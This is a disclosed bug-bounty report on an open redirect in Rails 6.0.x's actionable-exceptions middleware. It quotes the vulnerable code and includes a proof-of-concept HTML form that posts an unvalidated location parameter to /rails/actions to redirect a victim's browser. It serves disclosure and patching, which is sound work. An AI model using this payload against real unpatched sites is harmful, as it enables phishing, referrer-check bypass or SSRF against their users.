# Open Redirect (6.0.0 < rails < 6.0.3.2)

## Report Details
- **Report ID**: 904059
- **URL**: https://hackerone.com/reports/904059
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-06-21T02:15:14.122Z
- **Disclosed**: 2020-12-22T16:47:02.435Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rails

## Vulnerability Information
Hello,
I was looking at the change log (https://github.com/rails/rails/commit/2121b9d20b60ed503aa041ef7b926d331ed79fc2) for CVE-2020-8185 and found another problem existed.

https://github.com/rails/rails/blob/v6.0.3.1/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb#L21

```ruby
  redirect_to request.params[:location]
end

private
  def actionable_request?(request)
    request.show_exceptions? && request.post? && request.path == endpoint
  end

  def redirect_to(location)
    body = "<html><body>You are being <a href=\"#{ERB::Util.unwrapped_html_escape(location)}\">redirected</a>.</body></html>"

    [302, {
      "Content-Type" => "text/html; charset=#{Response.default_charset}",
      "Content-Length" => body.bytesize.to_s,
      "Location" => location,
    }, [body]]
  end
```

There was an open redirect issue because the request parameter `location` was not validated.
In 6.0.3.2, since the condition of `actionable_request?` has changed, this problem is less likely to occur.


### PoC


#### 1. Prepare server

Prepare an attackable 6.0.3.1 version of Rails server

```
❯ rails -v
Rails 6.0.3.1

❯ RAILS_ENV=production rails s
...
* Environment: production
* Listening on tcp://0.0.0.0:3000
```

#### 2. Attack server 

Prepare the server for attack on another port.

```html
<form method="post" action="http://localhost:3000/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=https://www.hackerone.com/">
	<button type="submit">click!</button>
</form>
````

```
python3 -m http.server 8000
```

#### 3. Open browser

Open the `http://localhost:8000/attack.html` url in your browser and click the button.
Redirect to `https://www.hackerone.com/` url.

{F876518}

## Impact

It will be fixed with 6.0.3.2 as with CVE-2020-8185(https://groups.google.com/g/rubyonrails-security/c/pAe9EV8gbM0), but I think it is necessary to announce it again because the range of influence is different.

This open redirect changes from POST method to Get Method, so it may be difficult to use for phishing.On the other hand, it may affect bypass of referrer check or SSRF.

## Attachments
- __________2020-06-21_10.26.21.png
